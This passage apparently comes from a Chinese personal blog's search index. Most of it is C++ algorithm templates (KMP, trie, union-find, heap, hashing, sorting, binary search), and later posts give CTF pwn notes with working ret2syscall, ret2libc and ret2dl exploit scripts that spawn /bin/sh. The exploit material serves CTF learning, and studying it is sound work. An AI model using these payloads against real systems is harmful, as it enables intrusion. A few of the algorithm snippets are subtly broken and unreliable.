]串中前缀和后缀相同的最大长度（部分匹配值），即 p[ 1, next[ j ] ] &#x3D; p[ j - next[ j ] + 1, j ]，也就是最长公共长度。（起始位1）next数组的求法是通过模板串自己与自己进行匹配操作得出来的 对 p &#x3D; “abcab” ​ p a b c a b下标 1 2 3 4 5next[ ] 0 0 0 1 2 12345678910111213141516171819202122232425// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度求模式串的Next数组：for (int i = 2, j = 0; i &lt;= m; i ++ )&#123; while (j &amp;&amp; p[i] != p[j + 1]) j = ne[j]; if (p[i] == p[j + 1]) j ++ ; ne[i] = j;&#125;// 匹配for (int i = 1, j = 0; i &lt;= n; i ++ )&#123; while (j &amp;&amp; s[i] != p[j + 1]) j = ne[j]; //如果j有对应p串的元素， 且s[i] != p[j+1], 则失配， 移动p串 //用while是由于移动后可能仍然失配，所以要继续移动直到匹配或整个p串移到后面（j = 0) if (s[i] == p[j + 1]) j ++ ; //当前元素匹配，j移向p串下一位 if (j == m) &#123; j = ne[j]; // 匹配成功后的逻辑 &#125;&#125; Tire树123456789101112131415161718192021222324252627282930int son[N][26], cnt[N], idx;//idx意义同本身的值和指向下一个结点的指针// 0号点既是根节点，又是空节点// son[][]存储树中每个节点的子节点// cnt[]存储以每个节点结尾的单词数量// 插入一个字符串void insert(char *str)&#123; int p = 0; for (int i = 0; str[i]; i ++ ) &#123; int u = str[i] - &#x27;a&#x27;; if (!son[p][u]) son[p][u] = ++ idx; p = son[p][u]; &#125; cnt[p] ++ ;&#125;// 查询字符串出现的次数int query(char *str)&#123; int p = 0; for (int i = 0; str[i]; i ++ ) &#123; int u = str[i] - &#x27;a&#x27;; if (!son[p][u]) return 0; p = son[p][u]; &#125; return cnt[p];&#125; 并查集1.将两个集合合并2.询问两个元素是否在一个集合当中基本原理:每个集合用一棵树来表示。树根的编号就是整个集合的编号。每个节点存储它的父节点，p[x]表示x的父节点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071(1)朴素并查集： int p[N]; //存储每个点的祖宗节点 // 返回x的祖宗节点 int find(int x) &#123;//返回x的祖先节点 + 路径压缩 //祖先节点的父节点是自己本身 if (p[x] != x) //将x的父亲置为x父亲的祖先节点,实现路径的压缩 p[x] = find(p[x]); return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) p[i] = i; //就是将当前数据的父节点指向自己 // 合并a和b所在的两个集合： p[find(a)] = find(b);(2)维护size的并查集： int p[N], size[N]; //p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量 // 返回x的祖宗节点 int find(int x) &#123; if (p[x] != x) p[x] = find(p[x]); return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) &#123; p[i] = i; size[i] = 1; &#125; // 合并a和b所在的两个集合： size[find(b)] += size[find(a)]; p[find(a)] = find(b);(3)维护到祖宗节点距离的并查集： int p[N], d[N]; //p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离 // 返回x的祖宗节点 int find(int x) &#123; if (p[x] != x) &#123; int u = find(p[x]); d[x] += d[p[x]]; p[x] = u; &#125; return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) &#123; p[i] = i; d[i] = 0; &#125; // 合并a和b所在的两个集合： p[find(a)] = find(b); d[find(a)] = distance; // 根据具体问题，初始化find(a)的偏移量 堆堆是一种完全二叉树，复习一下完全二叉树的定义，完全二叉树的形式是指除了最后一层之外，其他所有层的结点都是满的，而最后一层的所有结点都靠左边。教材上定义如下: 若设二叉树的深度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第 h 层所有的结点都连续集中在最左边，这就是完全二叉树。 如下图所示，就是一种典型的完全二叉树: 123456789101112131415161718192021222324252627282930313233343536// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1// ph[k]存储第k个插入的点在堆中的位置// hp[k]存储堆中下标是k的点是第几个插入的int h[N], ph[N], hp[N], size;// 交换两个点，及其映射关系void heap_swap(int a, int b)&#123; swap(ph[hp[a]],ph[hp[b]]); swap(hp[a], hp[b]); swap(h[a], h[b]);&#125;void down(int u)&#123; int t = u; if (u * 2 &lt;= size &amp;&amp; h[u * 2] &lt; h[t]) t = u * 2; if (u * 2 + 1 &lt;= size &amp;&amp; h[u * 2 + 1] &lt; h[t]) t = u * 2 + 1 ; if (u != t) &#123; heap_swap(u, t); down(t); &#125;&#125;void up(int u)&#123; while (u / 2 &amp;&amp; h[u] &lt; h[u / 2]) &#123; heap_swap(u, u / 2); u &gt;&gt;= 1; &#125;&#125;// O(n)建堆for (int i = n / 2; i; i -- ) down(i); 一般哈希(1) 拉链法 int h[N], e[N], ne[N], idx; // 向哈希表中插入一个数 void insert(int x) &#123; int k = (x % N + N) % N; e[idx] = x; ne[idx] = h[k]; h[k] = idx ++ ; &#125; // 在哈希表中查询某个数是否存在 bool find(int x) &#123; int k = (x % N + N) % N; for (int i = h[k]; i != -1; i = ne[i]) if (e[i] == x) return true; return false; &#125; (2) 开放寻址法 int h[N]; 1234567891011// 如果x在哈希表中，返回x的下标；如果x不在哈希表中，返回x应该插入的位置int find(int x)&#123; int t = (x % N + N) % N; while (h[t] != null &amp;&amp; h[t] != x) &#123; t ++ ; if (t == N) t = 0; &#125; return t;&#125; 字符串哈希核心思想：将字符串看成P进制数，P的经验值是131或13331，取这两个值的冲突概率低小技巧：取模的数用2^64，这样直接用unsigned long long存储，溢出的结果就是取模的结果 12345678910111213141516typedef unsigned long long ULL;ULL h[N], p[N]; // h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64// 初始化p[0] = 1;for (int i = 1; i &lt;= n; i ++ )&#123; h[i] = h[i - 1] * P + str[i]; p[i] = p[i - 1] * P;&#125;// 计算子串 str[l ~ r] 的哈希值ULL get(int l, int r)&#123; return h[r] - h[l - 1] * p[r - l + 1];&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"算法基础","slug":"算法基础-快排","date":"2022-07-06T16:00:00.000Z","updated":"2022-07-26T06:55:26.207Z","comments":true,"path":"2022/07/07/算法基础-快排/","link":"","permalink":"http://example.com/2022/07/07/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80-%E5%BF%AB%E6%8E%92/","excerpt":"","text":"STL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100vector, 变长数组，倍增的思想 size() 返回元素个数 empty() 返回是否为空 clear() 清空 front()/back() push_back()/pop_back() begin()/end() [] 支持比较运算，按字典序pair&lt;int, int&gt; first, 第一个元素 second, 第二个元素 支持比较运算，以first为第一关键字，以second为第二关键字（字典序）string，字符串 size()/length() 返回字符串长度 empty() clear() substr(起始下标，(子串长度)) 返回子串 c_str() 返回字符串所在字符数组的起始地址queue, 队列 size() empty() push() 向队尾插入一个元素 front() 返回队头元素 back() 返回队尾元素 pop() 弹出队头元素priority_queue, 优先队列，默认是大根堆 size() empty() push() 插入一个元素 top() 返回堆顶元素 pop() 弹出堆顶元素 定义成小根堆的方式：priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q;stack, 栈 size() empty() push() 向栈顶插入一个元素 top() 返回栈顶元素 pop() 弹出栈顶元素deque, 双端队列 size() empty() clear() front()/back() push_back()/pop_back() push_front()/pop_front() begin()/end() []set, map, multiset, multimap, 基于平衡二叉树（红黑树），动态维护有序序列 size() empty() clear() begin()/end() ++, -- 返回前驱和后继，时间复杂度 O(logn) set/multiset insert() 插入一个数 find() 查找一个数 count() 返回某一个数的个数 erase() (1) 输入是一个数x，删除所有x O(k + logn) (2) 输入一个迭代器，删除这个迭代器 lower_bound()/upper_bound() lower_bound(x) 返回大于等于x的最小的数的迭代器 upper_bound(x) 返回大于x的最小的数的迭代器 map/multimap insert() 插入的数是一个pair erase() 输入的参数是pair或者迭代器 find() [] 注意multimap不支持此操作。 时间复杂度是 O(logn) lower_bound()/upper_bound()unordered_set, unordered_map, unordered_multiset, unordered_multimap, 哈希表 和上面类似，增删改查的时间复杂度是 O(1) 不支持 lower_bound()/upper_bound()， 迭代器的++，--bitset, 圧位 bitset&lt;10000&gt; s; ~, &amp;, |, ^ &gt;&gt;, &lt;&lt; ==, != [] count() 返回有多少个1 any() 判断是否至少有一个1 none() 判断是否全为0 set() 把所有位置成1 set(k, v) 将第k位变成v reset() 把所有位变成0 flip() 等价于~ flip(k) 把第k位取反 快排模板： 12345678910111213141516void quick_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while(i &lt; j) &#123; do i++; while(q[i] &lt; x); do j--; while(q[j] &gt; x); if(i &lt; j) swap(q[i], q[j]); &#125; //第二步：递归处理子问题 quick_sort(q, l, j), quick_sort(q, j + 1, r); //第三步：子问题合并.快排这一步不需要操作，但归并排序的核心在这一步骤&#125; 例题给定你一个长度为 nn 的整数数列。 请你使用快速排序对这个数列按照从小到大进行排序。 并将排好序的数列按顺序输出。 输入格式输入共两行，第一行包含整数 nn。 第二行包含 nn 个整数（所有整数均在 1∼1091∼109 范围内），表示整个数列。 输出格式输出共一行，包含 nn 个整数，表示排好序的数列。 数据范围1≤n≤1000001≤n≤100000 输入样例：1253 1 2 4 5 输出样例：11 2 3 4 5 解题：1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N];void quick_sort(int q[],int l,int r)&#123; if (l&gt;=r)return; int x=q[l+r&gt;&gt;1],i=l-1,j=r+1; while(i&lt;j) &#123; do i++;while(q[i]&lt;x); do j--;while(q[j]&gt;x); if(i&lt;j) swap(q[i],q[j]); &#125; quick_sort(q,l,j); quick_sort(q,j+1,r);&#125;int main()&#123; int n; scanf(&quot;%d&quot;,&amp;n); //scanf比cin速度更快 for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); quick_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 归并排序模板 123456789101112131415161718192021void merge_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int mid = l + r &gt;&gt; 1; //第二步：递归处理子问题 merge_sort(q, l, mid ), merge_sort(q, mid + 1, r); //第三步：合并子问题 int k = 0, i = l, j = mid + 1, tmp[r - l + 1]; while(i &lt;= mid &amp;&amp; j &lt;= r) if(q[i] &lt;= q[j]) tmp[k++] = q[i++]; else tmp[k++] = q[j++]; while(i &lt;= mid) tmp[k++] = q[i++]; while(j &lt;= r) tmp[k++] = q[j++]; for(k = 0, i = l; i &lt;= r; k++, i++) q[i] = tmp[k];&#125; 例题同上 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N],tmp[N];void merge_sort(int q[],int l,int r)&#123; if(l&gt;=r) return; int mid = l + r&gt;&gt;1; merge_sort(q,l,mid); merge_sort(q,mid+1,r); int k=0,i=l,j=mid+1; while(i&lt;=mid &amp;&amp; j&lt;=r) if(q[i]&lt;=q[j]) tmp[k++]=q[i++]; else tmp[k++]=q[j++]; while(i&lt;=mid) tmp[k++]=q[i++]; while(j&lt;=r) tmp[k++]=q[j++]; for (i=l,j=0;i&lt;=r;i++,j++) q[i]=tmp[j]; &#125;int main()&#123; int n;C++ scanf(&quot;%d&quot;,&amp;n); for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); merge_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 二分123456789101112131415161718192021222324bool check(int x) &#123;/* ... */&#125; // 检查x是否满足某种性质// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：int bsearch_1(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (check(mid)) r = mid; // check()判断mid是否满足性质 else l = mid + 1; &#125; return l;&#125;// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：int bsearch_2(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r + 1 &gt;&gt; 1; if (check(mid)) l = mid; else r = mid - 1; &#125; return l;&#125; 例题给定一个按照升序排列的长度为 nn 的整数数组，以及 qq 个查询。 对于每个查询，返回一个元素 kk 的起始位置和终止位置（位置从 00 开始计数）。 如果数组中不存在该元素，则返回 -1 -1。 输入格式第一行包含整数 nn 和 qq，表示数组长度和询问个数。 第二行包含 nn 个整数（均在 1∼100001∼10000 范围内），表示完整数组。 接下来 qq 行，每行包含一个整数 kk，表示一个询问元素。 输出格式共 qq 行，每行包含两个整数，表示所求元素的起始位置和终止位置。 如果数组中不存在该元素，则返回 -1 -1。 数据范围1≤n≤1000001≤n≤1000001≤q≤100001≤q≤100001≤k≤100001≤k≤10000 输入样例：123456 31 2 2 3 3 4345 输出样例：1233 45 5-1 -1 exp 在数组中查找某元素，找不到就输出-1，找到了就输出不小于该元素的最小位置和不大于该元素的最大位置。所以，需要写两个二分，一个需要找到&gt;&#x3D;x的第一个数，另一个需要找到&lt;&#x3D;x的最后一个数。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;const int N=1000010;int q[N];int n,m;int main()&#123; scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); while (m--) &#123; int x; scanf(&quot;%d&quot;,&amp;x); int l=0,r=n-1; while (l&lt;r) //找到&lt;=x的第一个数 右边界 &#123; int mid =l+r &gt;&gt;1; if(q[mid]&gt;=x) r=mid; else l=mid+1; &#125; if(q[l]!=x)cout&lt;&lt;&quot;-1 -1&quot;&lt;&lt;endl; else &#123; cout&lt;&lt;l&lt;&lt;&#x27; &#x27;; int l=0,r=n-1; while(l&lt;r) //&gt;=x的最后一个数 左边界 &#123; int mid=l+r+1&gt;&gt;1; if(q[mid]&lt;=x) l=mid; else r=mid-1; &#125; cout&lt;&lt;l&lt;&lt;endl; &#125; &#125; return 0;&#125; 高精1 度减法12345678910111213141516// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; sub(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B)&#123; vector&lt;int&gt; C; for (int i = 0, t = 0; i &lt; A.size(); i ++ ) &#123; t = A[i] - t; if (i &lt; B.size()) t -= B[i]; C.push_back((t + 10) % 10); if (t &lt; 0) t = 1; else t = 0; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;&#125; 高精度乘以低精度123456789101112131415// C = A * b, A &gt;= 0, b &gt;= 0vector&lt;int&gt; mul(vector&lt;int&gt; &amp;A, int b)&#123; vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size() || t; i ++ ) &#123; if (i &lt; A.size()) t += A[i] * b; C.push_back(t % 10); t /= 10; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back();&#125; 高精度除以低精度12345678910111213141516// A / b = C ... r, A &gt;= 0, b &gt; 0vector&lt;int&gt; div(vector&lt;int&gt; &amp;A, int b, int &amp;r)&#123; vector&lt;int&gt; C; r = 0; for (int i = A.size() - 1; i &gt;= 0; i -- ) &#123; r = r * 10 + A[i]; C.push_back(r / b); r %= b; &#125; reverse(C.begin(), C.end()); while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); r&#125; 前缀和一维 12S[i] = a[1] + a[2] + ... a[i]a[l] + ... + a[r] = S[r] - S[l - 1] 二维 123S[i, j] = 第i行j列格子左上部分所有元素的和以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：S[x2, y2] - S[x1 - 1, y2] - S[x2, y1 - 1] + S[x1 - 1, y1 - 1] 差分一维 1给区间[l, r]中的每个数加上c：B[l] += c, B[r + 1] -= c 二维 12给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：S[x1, y1] += c, S[x2 + 1, y1] -= c, S[x1, y2 + 1] -= c, S[x2 + 1, y2 + 1] += c ![ 1 ](https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207081703562.png) b[x1][ y1 ] +&#x3D;c ; 对应图1 ,让整个a数组中蓝色矩形面积的元素都加上了c。b[x1,][y2+1]-&#x3D;c ; 对应图2 ,让整个a数组中绿色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y1]- &#x3D;c ; 对应图3 ,让整个a数组中紫色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y2+1]+&#x3D;c; 对应图4,,让整个a数组中红色矩形面积的元素再加上c，红色内的相当于被减了两次，再加上一次c，才能使其恢复。 双指针算法123456789for (int i = 0, j = 0; i &lt; n; i ++ )&#123; while (j &lt; i &amp;&amp; check(i, j)) j ++ ; // 具体问题的逻辑&#125;常见问题分类： (1) 对于一个序列，用两个指针维护一段区间 (2) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作 离散化12345678910111213141516vector&lt;int&gt; alls; // 存储所有待离散化的值sort(alls.begin(), alls.end()); // 将所有值排序alls.erase(unique(alls.begin(), alls.end()), alls.end()); // 去掉重复元素// 二分求出x对应的离散化的值int find(int x) // 找到第一个大于等于x的位置&#123; int l = 0, r = alls.size() - 1; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1; // 映射到1, 2, ...n&#125; 例题：假定有一个无限长的数轴，数轴上每个坐标上的数都是 00。 现在，我们首先进行 nn 次操作，每次操作将某一位置 xx 上的数加 cc。 接下来，进行 mm 次询问，每个询问包含两个整数 ll 和 rr，你需要求出在区间 [l,r][l,r] 之间的所有数的和。 输入格式第一行包含两个整数 nn 和 mm。 接下来 nn 行，每行包含两个整数 xx 和 cc。 再接下来 mm 行，每行包含两个整数 ll 和 rr。 输出格式共 mm 行，每行输出一个询问中所求的区间内数字和。 数据范围−109≤x≤109−109≤x≤109,1≤n,m≤1051≤n,m≤105,−109≤l≤r≤109−109≤l≤r≤109,−10000≤c≤10000−10000≤c≤10000 输入样例：12345673 31 23 67 51 34 67 8 输出样例：123805 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;typedef pair&lt;int, int&gt; PII;const int N = 300010;int a[N], s[N];int n, m;vector&lt;int&gt; alls;vector&lt;PII&gt; add, query;int find(int x)&#123; int l = 0, r = alls.size() - 1; while(l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if(alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1;&#125;vector&lt;int&gt;:: iterator unique(vector&lt;int&gt; &amp;a)&#123; int j = 0; for(int i = 0; i &lt; a.size(); i ++) if(!i || a[i] != a[i - 1]) a[j ++ ] = a[i]; return a.begin() + j;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; m; for(int i = 0; i &lt; n; i ++ ) &#123; int x, c; cin &gt;&gt; x &gt;&gt; c; add.push_back(&#123;x, c&#125;); alls.push_back(x); &#125; for(int i = 0; i &lt; m; i ++ ) &#123; int l, r; cin &gt;&gt; l &gt;&gt; r; query.push_back(&#123;l, r&#125;); alls.push_back(l); alls.push_back(r); &#125; sort(alls.begin(), alls.end()); alls.erase(unique(alls), alls.end()); for(auto item : add) &#123; int x = find(item.first); a[x] += item.second; &#125; for(int i = 1; i &lt;= alls.size(); i ++ ) s[i] = s[i - 1] + a[i]; for(auto item : query) &#123; int l = find(item.first), r = find(item.second); cout &lt;&lt; s[r] - s[l - 1] &lt;&lt; endl; &#125; return 0;&#125; 区间合并1）把要合并的区间按区间左端点从小到大排序2）用st和ed指针从前往后维护区间3）比较ed 和后一个区间的左端点，分情况更新ed和first 1234567891011121314151617181920// 将所有存在交集的区间合并void merge(vector&lt;PII&gt; &amp;segs)&#123; vector&lt;PII&gt; res; sort(segs.begin(), segs.end()); int st = -2e9, ed = -2e9; for (auto seg : segs) //定义了一个自动类型变量seg, seg的取值从segs[0]开始到segs末尾，也就是遍历了segs if (ed &lt; seg.first) &#123; if (st != -2e9) res.push_back(&#123;st, ed&#125;); st = seg.first, ed = seg.second; &#125; else ed = max(ed, seg.second); if (st != -2e9) res.push_back(&#123;st, ed&#125;); segs = res;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"}],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"pwndbg/pwntools","slug":"pwn入门","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-06T07:57:03.183Z","comments":true,"path":"2022/07/06/pwn入门/","link":"","permalink":"http://example.com/2022/07/06/pwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"pwndbg&#x2F;gdb的使用X的使用x 是 examine 的缩写 n 表示要显示的内存单元的个数 u 表示一个地址单元的长度： b 表示单字节h 表示双字节w 表示四字节g 表示八字节f 表示显示方式，可取如下值： x 按十六进制格式显示变量d 按十进制格式显示变量u 按十进制格式显示无符号整型o 按八进制格式显示变量t 按二进制格式显示变量a 按十六进制格式显示变量i 指令地址格式c 按字符格式显示变量f 按浮点数格式显示变量举例x &#x2F;20gx buf: 表示从内存地址 buf 读取内容，g 表示八字节，20 表示 20 个单位，x 按十六进制格式显示变量 x &#x2F;3hu buf：表示从内存地址 buf 读取内容，h 表示以双字节为一个单位，3 表示三个单位，u 表示十进制格式显示无符号整型 P的使用打印指令p(print)：p fun_name &#x2F;&#x2F;打印fun_name的地址，需要保留符号p 0x10-0x08 &#x2F;&#x2F;计算0x10-0x08的结果p &amp;a &#x2F;&#x2F;查看变量a的地址p *(0x123456) &#x2F;&#x2F;查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号p $rdi &#x2F;&#x2F;显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值p *($rdi) &#x2F;&#x2F;显示rdi指向的值 cycliccyclic n ：生成长度为n的字符串 cyclic -l aaaa #查找偏移（一般是返回地址 假如说我想找aaaj这个字符串的偏移，我们可以用 1cyclic_find(&#x27;aaaj&#x27;) 其他info all-registers 查看所有的寄存器的值 pwntools的使用p32 p64就是将一个数字转换为字符，例如 1p32(0xdeadbeef) 就会转换为 1&#x27;\\xef\\xbe\\xad\\xde&#x27; 这里顺序反了是因为linux编译的程序是小端序的 u32 u64就是将字符转换为数字，","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"入门","slug":"入门","permalink":"http://example.com/tags/%E5%85%A5%E9%97%A8/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"栈溢出","slug":"栈溢出","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-14T08:31:00.199Z","comments":true,"path":"2022/07/06/栈溢出/","link":"","permalink":"http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"ret2syscallLinux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 应用程序调用系统调用的过程是： 1、把系统调用的编号存入 EAX 2、把函数参数存入其它通用寄存器 3、触发 0x80 号中断（int 0x80） 在32位下： 1.将EAX寄存器的值设置为OXb:EAX &#x3D; OXb 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; 0 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; o 64位下： 1.将RAX寄存器的值设置为0×3b:RAX &#x3D; OX3b 2.将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI &#x3D; &amp;(“ &#x2F;bin&#x2F;sh”) 3.将RSI和RDX寄存器的值都设为0: RSI &#x3D; RDX &#x3D; o 只需要让栈顶的值 然后可以通过 pop eax 达到目的 例（CTFwiki）： 计算偏移 运用ropper 查找int 0x80系统调用 1ropper -f ret2syscall --search &quot;int 0x80&quot; 运用ropper 查找其他寄存器 1ropper -f ret2syscall --search &quot;pop|ret&quot;| grep &#x27;eax&#x27; 其他类推 在IDA找到bin&#x2F;sh的地址 exp: 123456789101112131415161718192021222324from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2syscall&quot;)if args.G: gdb.attach(p)pop_eax_ret = 0x080bb196pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806eb91pop_edx_ecx_ebx_ret = 0x0806eb90pop_edx_ret = 0x0806eb6aint_0x80 = 0x08049421bin_sh_addr = 0x80be408p.recvuntil(&quot;What do you plan to do?\\n&quot;)payload = b&quot;a&quot;*112 + p32(pop_eax_ret) payload += p32(0xb) + p32(pop_edx_ecx_ebx_ret) payload += p32(0) + p32(0) + p32(bin_sh_addr) payload += p32(int_0x80)p.sendline(payload)p.interactive() ret2libc 例1：在ida找到bin&#x2F;sh字符串地址 查找到system函数存在地址 123456from pwn import *p = process(&quot;./ret2libc1&quot;)p.recvuntil(&quot;RET2LIBC &gt;_&lt;\\n&quot;)payload = b&quot;a&quot;*112 + p32(0x8048460) + b&quot;xxxx&quot; + p32(0x8048720)p.sendline(payload)p.interactive() 例2没有system函数。也没有binsh字符串 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 https://github.com/niklasb/libc-database 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。 基本利用思路如下 泄露 puts函数 地址 获取 libc 版本 获取 system 地址与 &#x2F;bin&#x2F;sh 的地址 再次执行源程序 触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’) 单步运行过puts函数，查询got表 通过vmmap找到对应libc的基地址，并且计算偏移 再计算system函数的偏移 然后searh “bin&#x2F;sh”的地址，再计算bin&#x2F;sh1的偏移 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2libc2&quot;)if args.G: gdb.attach(p)gets_plt = 0x8048440puts_plt = 0x8048460main_addr = 0x8048618puts_got = 0x804a018p.recvuntil(&quot;Can you find it !?&quot;)payload = b&quot;a&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)p.sendline(payload)puts_addr = u32(p.recv(4))libc_addr = puts_addr - 0x6dc30system_addr = libc_addr + 0x41790bin_sh_addr = libc_addr + 0x18e363success(&quot;puts_addr: &quot; + hex(puts_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Can you find it !?&quot;)payload1 = b&quot;a&quot;*104 + p32(system_addr) + b&quot;xxxx&quot; + p32(bin_sh_addr)#payload1 = b&quot;a&quot;*104 + p32(gets_plt) + p32(system_addr) + p32(0x804a020) + p32(0x804a020)p.sendline(payload1)&#x27;&#x27;&#x27;sleep(0.2)p.sendline(&quot;/bin/sh\\x00&quot;)&#x27;&#x27;&#x27;p.interactive() ret2dl ELF关于动态链接的关键segment： .dynamic:一般保存了ELF文件依赖于哪些动态库,动态符号节信息; 各segment的位置关系: .dynamic的地址加Ox44的位置是. dynstr;.dynamic的地址加Ox4c的位置是. dynsym;.dynamic的地址加Ox84的位置是.rel.plt; 第一次调用一个函数时_dl_runtime_resolve函数的工作: _dl_runtime resolve(link map_obj, reloc index)： 1.首先用link_map访问.dynamic，分别取出.dynstr、.dynsym、.rel.plt的地址; 2..rel.plt ＋参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel; 3.rel-&gt;r_info &gt; &gt;8&#x3D; n作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;4..dynstr + sym-&gt;st_name得出符号名字符串指针; 5.在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表; 6.最后调用这个函数; 例题： 思路: exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27; ,&#x27;-c&#x27;]name = &#x27;./pwn&#x27;p = process(name)#p=remote(&#x27;chall.pwnable.tw&#x27;, 10103)elf= ELF(name)#libc = ELF(&#x27;./libc_32.so.6&#x27;)if args.G: gdb.attach(p) rel_plt_addr = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addr #0x8048330dynsym_addr = 